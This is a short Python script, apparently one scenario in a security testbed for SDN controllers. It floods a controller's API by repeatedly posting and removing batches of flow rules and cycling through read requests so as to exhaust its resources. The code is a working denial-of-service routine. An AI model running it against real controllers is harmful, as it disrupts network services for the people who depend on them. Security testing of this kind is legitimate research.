#!/usr/bin/env python3
"""S1: API flooding and resource exhaustion as t1-op (VM; Python 3.6, stdlib only)."""
import argparse
import sys
import time

from common import Client, S2, add_args, eth_type, flow, in_port, output, run_main

BATCH = 10
PRIORITY_BASE = 28000


def main():
    parser = add_args(argparse.ArgumentParser(), 0.0)
    args = parser.parse_args()
    c = Client(args, "S1", args.variant)
    def attack():
        end = time.time() + args.duration
        reads = ("flows", "intents", "devices", "links", "topology", "hosts")
        n = 0
        next_t = time.time()
        try:
            while time.time() < end:
                if n % 10 == 0:
                    rules = [flow(S2, PRIORITY_BASE + i, [in_port(1), eth_type()], output(3))
                             for i in range(BATCH)]
                    c.post_flows(rules, op="post_batch", variant=args.variant)
                    c.drain_flows(variant=args.variant)
                name = reads[n % len(reads)]
                c.get(name, op="get_" + name, variant=args.variant)
                n += 1
                if args.rate > 0:
                    next_t = max(next_t + 1.0 / args.rate, time.time())
                    time.sleep(max(0.0, next_t - time.time()))
        finally:
            c.cleanup()
        return 0

    try:
        return attack()
    except KeyboardInterrupt:
        return 130


if __name__ == "__main__":
    sys.exit(run_main(main))
